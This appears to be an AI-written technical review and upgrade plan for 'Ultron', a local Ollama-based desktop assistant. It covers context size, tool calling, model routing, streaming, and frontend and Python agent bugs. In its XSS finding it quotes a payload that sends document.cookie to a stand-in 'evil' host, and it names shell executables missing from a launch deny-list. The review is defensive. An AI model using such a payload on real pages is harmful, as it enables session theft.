# ULTRON 5.1 — AI Model Assessment & Upgrade Plan

**Scope:** `ultron (5).html` (4,563 lines), `ultron_agent.py` (966 lines),
`requirements-agent.txt`, `start_ultron_agent.bat`

**Core finding:** the intelligence in Ultron lives entirely in the browser. The Python
agent is a pure actuator layer — it executes ~18 commands and has no model, no
routing, and no context. Every model decision is made in ~250 lines of JS
(`askOllama`, `pickModel`, `isCodingTask`, `SYSTEM_PROMPT`). That file is where
almost every improvement below applies.

---

## PART 1 — The model layer, ranked by impact

### 1. CRITICAL — No `num_ctx` is sent, so you are silently running at 4K context

`askOllama()` (HTML:2503) posts no `options` block at all.

Ollama v0.15.5+ picks its default context from VRAM
([docs](https://docs.ollama.com/context-length)):

| VRAM | Default context |
|---|---|
| < 24 GiB | **4,096 tokens** |
| 24–48 GiB | 32,768 tokens |
| ≥ 48 GiB | 262,144 tokens |

Ultron is explicitly a *laptop* agent. On the target hardware you get **4,096
tokens** — and you are already spending ~350 tokens on `SYSTEM_PROMPT` plus up to
10 history turns. The practical effect is silent truncation of the *oldest*
messages, degrading exactly the long-context reasoning the persona claims.

This matters more than it looks, because Ollama's own documentation warns that at
low context the model "can run out of room and return a blank response, or emit a
raw tool-call JSON blob instead of actually calling the tool"
([Open WebUI docs](https://docs.openwebui.com/getting-started/quick-start/connect-a-provider/starting-with-ollama/)). The moment you add tool schemas (see #3), 4K becomes an active failure mode.

**Fix:** always send an explicit `options.num_ctx` (8,192 minimum; 32,768 if
VRAM allows) — a per-request `num_ctx` overrides the server default, so you
control it regardless of the machine.

### 2. CRITICAL — The model cannot call anything; a parallel regex engine decides

This is the largest architectural gap. The LLM only ever emits **text**. What
actually happens on the machine is decided by `parseCommand()` / `parseAuthority()`
(HTML:3407+) — roughly 60 anchored regexes that have to be extended by hand for
every new phrase. The model and the actuator are two disconnected systems.

Consequence: the LLM has no way to express intent the regex doesn't anticipate,
so the entire "agent" surface is the regex lexicon. Adding "mute the mic" or
"set a 30 minute focus timer" means writing a new regex, not teaching the model.

**Fix:** Ollama has native function calling, and both of your target models
support it — `gemma4` is tagged `vision tools thinking audio` on the Ollama library,
and `qwen3-coder` is explicitly "tools". Convert the command lexicon into an
Ollama `tools` array. The model then selects the tool and arguments; your existing
`agentCall()` executes it. See `ultron-ai-upgrade.js` for a working implementation.

This also collapses two sources of truth (prompt + regex lexicon) into one.

### 3. HIGH — The hardcoded model dropdown is stale and disconnected from reality

The `<select id="setting-model">` (HTML:940) offers:

```
gemma4:12b · qwen2.5:7b · llama3.2 · llama3 · mistral · phi3 · gemma2
```

`llama3`, `llama3.2`, `mistral`, `phi3`, `gemma2` and `qwen2.5` are all
generations behind. The current Ollama library includes `gemma4` (e2b/e4b/12b/26b/31b),
`qwen3-coder` (30b/480b), `qwen3-coder-next`, `qwen3.5`, `gpt-oss:120b`,
`ministral-3`, `nemotron-3-nano`, `deepseek-v4`, `glm-5.1`, `kimi-k2.5`, `devstral-2`,
`qwen3-vl`.

Worse: `checkOllama()` **does** fetch `/api/tags` and store the real list in
`state.availableModels` (HTML:2458) — and then never uses it to populate the
dropdown. So the user can select a model they haven't pulled, and Ollama returns a
404 that surfaces as a generic error. Meanwhile, the `options` list is static and
never reflects what the machine actually has.

**Fix:** populate both `<select>` elements from `state.availableModels`, grouped and
annotated by size. (Implemented in the upgrade module.)

### 4. HIGH — `pickModel()` is a regex guessing game with a dead branch

```js
if (models.includes(state.model)) return state.model;      // exact
const gemma4 = models.find(m => /gemma4(?::12b)?/i.test(m) || /gemma.*4/i.test(m));
const prefix = models.find(m => m === state.model || m.startsWith(state.model + '-') ...);
```

* The `prefix` branch (HTML:2399) re-tests `m === state.model`, which the exact-match
  check at HTML:2394 already handled — **it can never fire on its own.**
* The fallback chain (`any gemma` → `any qwen` → `models[0]`) will happily select a
  1B model as the "core intelligence" purely because of its name. `models[0]` is
  whatever Ollama happens to list first — essentially arbitrary.
* The regex `/gemma.*4/i` matches `gemma4:31b`, `gemma4:26b`, and also unrelated
  names.

**Fix:** replace with an explicit capability-ranked registry that scores candidates
on size, family, and capability, and falls back to the *largest* model present
rather than `models[0]`.

### 5. HIGH — The smart router is a keyword matcher, not a router

`isCodingTask()` (HTML:2419) applies ~30 regexes to the raw text. It has clear
false positives:

| Input | Contains | Routed to coder? | Correct? |
|---|---|---|---|
| "Explain how this CSS class works" | `css` | yes | no |
| "What's a good Python framework" | `python` | yes | borderline |
| "Write a function that renames files" | `function` | yes | yes |
| "Review this React component" | `react`→no match | no | **yes** (miss) |

It also has no notion of *task class* beyond code. Reasoning-heavy, research,
and multi-step agentic work all fall to the core model regardless of difficulty.

**Fix:** score on three axes rather than one keyword bucket — (a) task class
(code / analysis / chat / agentic), (b) reasoning depth (multi-step, "why",
"compare", "design"), (c) model capability. Route on the combined score.

### 6. HIGH — `SYSTEM_PROMPT` states model identity and capabilities that may be false

```
- Core Intelligence: Gemma 4 12B (general reasoning, analysis, communications).
- Neural Code Specialist: Qwen Coder (automatically routed for ...)
- Connected Integrations:
  * Gmail Connector: Ingests recent unread mail, drafts and securely dispatches email.
  * WhatsApp Connector: ...
```

Three problems:

1. **Model identity is hardcoded.** If the user selects `qwen3.5` in Settings, the
   prompt still claims to be Gemma 4 12B. The model is told a falsehood about
   itself.
2. **Capabilities are asserted, not detected.** Gmail/WhatsApp/News/Vision are
   listed unconditionally, but each can be disabled in Settings or unreachable
   (the agent offline). The model will confidently tell the user "I'll send that
   email" when the Gmail connector is off — the honest path is to say it's offline.
3. **Router state is invisible.** The prompt never tells the model that a coder
   model may have handled the previous turn, so turn-to-turn style drifts when the
   router flips.

**Fix:** build the system prompt dynamically from the live model, router mode,
`state.availableModels`, and connector/agent status. See `buildSystemPrompt()` in
the upgrade module.

### 7. MEDIUM-HIGH — Vision is routed through a server that isn't in this file set

`doVision()` (HTML:3684) captures the frame **locally** via `agentCall('screenshot')`
— good — but then ships it to `POST /api/ultron/vision` for analysis. There is no
such route in `ultron_agent.py`, and no server implementation in this file set. The
same applies to `/api/ultron/draft` (HTML:3741) and `/api/ultron/draft` (minutes,
HTML:3892). If those routes aren't provided by the hosting platform, the features
silently fall through to placeholder text ("Vision model unavailable").

**The upgrade opportunity:** `gemma4` is natively multimodal (Text + Image input).
Ollama's `/api/chat` accepts an `images` array of base64 strings. The Python agent
already returns a base64 JPEG from `screenshot`. So the whole loop — capture,
analyze, answer — can run **fully locally** with the model you already chose,
with no server route and no data leaving the machine.

### 8. MEDIUM — No streaming

`askOllama()` uses `stream: false`. The entire generation blocks before anything
renders. For a HUD with a typing indicator already implemented (`.typing` CSS, HTML:215),
this is a large perceived-latency regression — and on a cold model load (7–8 GB into
VRAM) the user stares at a spinner for 30–60 seconds with no feedback.

Ollama's `/api/chat` supports `stream: true` with newline-delimited JSON. The
upgrade module implements an NDJSON reader with incremental `onDelta` callbacks.

### 9. MEDIUM — Thinking capability is entirely unused

Since Ollama v0.9.0, thinking-capable models return their reasoning in a separate
`thinking` field, and the `think` parameter controls it (`true` / `false` /
`low` / `medium` / `high` / `max`). `gemma4` supports thinking.

Your app ignores `data.thinking` entirely. Two implications:

* Smaller local models often need thinking enabled to produce coherent output at
  all — a 4B model without it is noticeably weaker.
* The reasoning trace is a premium UX feature for this kind of HUD: render it in a
  collapsible "THINKING" block, separate from the answer.

The upgrade module handles both.

### 10. MEDIUM — No timeout or abort on the chat request

`checkOllama()` has a 5-second `AbortController` (HTML:2447). `askOllama()` has
**none**. If the model wedges, or the connection stalls, the UI hangs forever with
the typing indicator spinning. The agent's `agentCall()` correctly uses a 15s timeout
(HTML:3401) — the LLM path just wasn't given the same treatment.

### 11. MEDIUM — No sampling controls, and first-token latency is unhandled

* No `temperature` anywhere. Ollama's default is 0.8 — acceptable for chat, poor
  for code, where 0.1–0.2 is standard.
* No `keep_alive`. The model is evicted from VRAM between messages and reloaded on
  the next one. `keep_alive: "10m"` keeps it resident and removes a 30–60 s stall
  from every second message.
* No distinction between "model is loading" and "model is thinking" in the UI.

### 12. MEDIUM — `EMBEDDED` mode hard-disables Ollama

```js
if (EMBEDDED){ state.ollamaOnline = false; ... return false; }
```

The embedded deployment never attempts Ollama, even when `state.endpoint` points
at a perfectly good local server. It falls to `askGrokBridge()` → `/api/ultron/chat`
→ and if that route is absent, to the hardcoded `offlineReply()` string
(HTML:2533). The hosted build therefore ships with a personality that can only
say ~8 canned sentences.

---

## PART 2 — Frontend bugs found in the AI-adjacent paths

### 13. SECURITY — Stored XSS via email subject

`doMailBrief()` (HTML:3712) interpolates IMAP-fetched fields straight into `innerHTML`:

```js
`<b style="color:var(--accent);">${e.from}</b>: <span>${e.subject}</span>
 <div ...>${e.snippet}</div>`
```

`e.subject` and `e.snippet` are attacker-controlled email content. A message with
the subject `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes in the
page. For a local agent that renders email, this is the highest-severity finding in
the review. Escape every interpolated field.

### 14. SECURITY — `replace(/</g,'<')` is a no-op, in five places

HTML:3695, 3698, 3759, 3798, 3894 all contain `.replace(/</g,'<')` — replacing `<`
with `<`. These were clearly meant to be `&lt;`; HTML:3842 does it correctly with
`.replace(/</g,'&lt;')`, confirming the intent. Server-returned text from
`/api/ultron/vision`, `/api/ultron/draft`, and the minutes endpoint lands in
`innerHTML` with no working sanitizer.

### 15. The two CSS blocks fight each other

There are two `:root` blocks and two `html,body` rules. The boot-sequence block
(HTML:470) comes later and wins:

```css
html,body{ background:#000; color:#e8f2ff; }
```

This overrides the themed `body.theme-ultron` background, so the crimson theme
never reaches the page background — the canvas is always pure black while every
panel is themed. Consolidate into one `:root` and one `html,body` rule.

### 16. Monolith risk

4,563 lines with the AI layer, Three.js scene, gesture control, boot sequence,
IndexedDB layer, modals, and connector UI all inline. Any AI-layer edit risks
colliding with the render loop or a duplicate `id`. Extract at minimum
`ultron-ai.js` (model registry + client + router + tools) and `ultron-agent.js`
(WebSocket client).

---

## PART 3 — Python agent (`ultron_agent.py`)

The agent is competent and the security posture is thoughtful (localhost-only,
token gate, command allowlist, no `shell=True`). The issues below are real but
none are architectural.

| # | Severity | Issue | Location |
|---|---|---|---|
| 17 | HIGH | **App password leaks in plaintext.** `get_connectors` deep-copies the config then *adds* `app_password_masked` while leaving `app_password` intact in the payload. | 859–866 |
| 18 | HIGH | **Unbounded file search.** Comment says "Restrict depth to 4 levels" but the code uses `rglob("*")` with no depth limit. With no matches it walks the entire tree (incl. `node_modules`), blocking the handler thread for tens of seconds. | 402–413 |
| 19 | HIGH | **Radio is a silent no-op.** `execute_system_radio` only implements `wifi` on Windows, but the UI and `parseAuthority` expose Bluetooth and airplane mode. It returns `{"kind","on"}` — reporting success for an action that never happened. | 271–278 |
| 20 | MEDIUM | **Arbitrary executable launch.** `SAFE_APP_MAP` is checked, but any unmatched name falls through to a sanitized arbitrary exe passed to `os.startfile`. There is no deny-list for `cmd`/`powershell`/`wscript`/`mshta`. | 298–319 |
| 21 | MEDIUM | **Substring process kill.** `if target in pname` means "kill chrome" matches any process whose name contains "chrome". Also uses `terminate()` with no escalation. | 326–340 |
| 22 | MEDIUM | **`load_config()` on every request.** Called by `check_rate_limit` (per message), `gmail_*`, `fetch_news`, and `get_connectors` — a full disk read + JSON parse per WebSocket frame. | 142–154 |
| 23 | MEDIUM | **macOS `sudo` without `-n`.** `sudo shutdown -r` with no TTY hangs on a password prompt that can never be answered. | 249–253 |
| 24 | MEDIUM | **Gmail subject truncation.** `decode_header(...)[0]` takes only the first encoded word of a multi-part MIME-encoded subject, and ignores the charset of later parts. | 531–533 |
| 25 | LOW | **Rate-limit store never pruned** and keyed by token, so it grows unbounded across token rotations. | 140–154 |
| 26 | LOW | `mail.close()` is skipped on the exception path. | 567 |

### Packaging — `requirements-agent.txt` & `start_ultron_agent.bat`

* **`pywhatkit` is effectively unmaintained** and pulls in Selenium to drive a real
  browser. It is also the reason the WhatsApp connector is fragile. Prefer the
  WhatsApp Business Cloud API (webhook-based, no browser, works headless) with
  pywhatkit as an optional fallback.
* **`comtypes` is Windows-only** but is listed unconditionally; `pycaw` also needs
  `pywin32` on some setups. `screen-brightness-control` is Windows/macOS only.
* **Every dependency is a `>=` floor** with no upper bounds and no lockfile. A
  breaking upstream release will break the agent silently. Pin exact versions and
  commit a lockfile.
* **`start_ultron_agent.bat` is thin.** It creates no venv, installs no
  requirements, doesn't check the Python version, and its `if errorlevel 1 python3`
  fallback re-runs the script when `python` exists but the *script itself* failed.
  No restart-on-crash.

---

## PART 4 — Recommended upgrade order

| Priority | Change | Effort | Why now |
|---|---|---|---|
| **P0** | Send explicit `options.num_ctx` (8K+) | 5 min | Silent truncation on every laptop |
| **P0** | Escape email fields; fix the 5 no-op `replace(/</g,'<')` | 15 min | Live XSS |
| **P0** | Populate model dropdowns from `/api/tags` | 20 min | Removes a whole class of 404s |
| **P1** | Streaming chat with abort + timeout | 1 hr | Latency; HUD already has a typing indicator |
| **P1** | Dynamic system prompt (real model, real capabilities) | 1 hr | Stops the model lying about itself |
| **P1** | Ollama native tool calling → agent commands | 3–4 hr | The single biggest capability gain |
| **P2** | Capability-ranked model registry; better router | 1 hr | Replaces regex guessing |
| **P2** | `keep_alive` + thinking field rendering | 45 min | Removes repeated 30 s cold starts |
| **P2** | Local multimodal vision via gemma4 | 2 hr | Removes the `/api/ultron/vision` dependency |
| **P3** | Agent: config cache, depth-limited search, radio, launch allowlist | 2 hr | Correctness + hardening |
| **P3** | Split the monolith; pin dependencies | 2 hr | Maintainability |

---

## PART 5 — The files shipped with this review

### `ultron-ai-upgrade.js`
The replacement AI layer: capability-ranked model registry, `/api/tags`-driven
dropdown population, `num_ctx` + per-task temperature + `keep_alive`, streaming
NDJSON client with abort and timeout, thinking-model support, Ollama native tool
calling wired to the existing `agentCall()` and the agent's command allowlist, a
dynamic system prompt reflecting the live model/router/connector state, and a
three-axis router replacing `isCodingTask()`.

> **Correction to an earlier draft of this review.** This file was originally
> described as a `<script src>` drop-in that overrides functions on `window`.
> That does not work, and the reason is structural: the entire application in
> `ultron (5).html` lives inside a single `<script type="module">` block
> (lines 1684-4561). Module scope is isolated — `askOllama`, `checkOllama`,
> `pickModel`, `pickCoderModel`, `isCodingTask`, `state` and `osState` are
> **not** properties of `window`, so an external script can neither read nor
> replace them.
>
> The fix is to **inject** the upgrade *inside* the module. Module-level
> `function` declarations are mutable bindings, so `askOllama = ...` inside the
> module rebinds the app's own function, and every internal call site —
> including `handleUserMessage` -> `askOllama` and the
> `setInterval(checkOllama, 15000)` poller — picks it up. `install.py` performs
> this injection automatically at the right point (after the module's `import`
> block).
>
> The same isolation means `const state` / `const osState` cannot be reached via
> `window.state` / `window.osState`; the upgrade resolves them through a safe
> accessor instead.

### `ultron-agent-fixes.py`
Splice-ready replacements for the eleven backend issues in Part 3, each marked
with the function it replaces. Insert above the `if __name__ == "__main__":`
guard so the redefinitions take effect before the server starts.

### `install.py` (in the runnable package)
Builds `ultron.html` and `ultron_agent.py` from the pristine originals in
`src/`, performing the module injection and the agent splice in one step.
Idempotent — re-running it on an already-built tree is a no-op.

---

## Verification notes

* Model lineup, tag names, capabilities, and the VRAM-tiered context defaults were
  checked against the live Ollama library and docs (Nov 2026).
* `gemma4` **does** exist (released Oct 2025) with tags e2b / e4b / 12b / 26b / 31b
  and `vision tools thinking audio` capabilities — the existing `gemma4:12b` default
  is sound and the vision recommendation rests on confirmed multimodal support.
* The Python agent was not executed (Windows-only: pycaw, `rundll32`, `shutdown /s`,
  and `os.startfile` are all platform-locked); backend findings are from source
  review. The JS upgrade module was syntax-checked with Node and its logic was
  exercised in a mocked harness:
  * model registry → core `gemma4:12b`, coder `qwen3-coder:30b`, vision `gemma4:12b`
    from a mixed 10-model list (the old `pickModel` would have picked arbitrarily);
  * router → 7/7 cases pass, including the two false positives the old
    keyword matcher got wrong;
  * tool loop → mocked Ollama returns a `set_volume(42)` tool call, the agent
    receives `volume {level:42}`, and the model's follow-up text is returned;
  * tool-schema rejection → falls back to a plain chat instead of failing the turn;
  * HTTP errors surface the server's message instead of a generic failure.
* One implementation trap worth recording: `state` and `osState` are declared with
  `const` at the top level of the page, so they live in the global **lexical**
  scope and are **not** properties of `window`. Any module that reaches for
  `window.osState` gets `undefined`. The upgrade module resolves them through a
  safe accessor instead.
* The `/api/ultron/chat|vision|draft` routes are not present in the provided file
  set. If the hosting platform does not supply them, the Grok bridge, vision, and
  minutes features are inert — confirmed before investing in them.

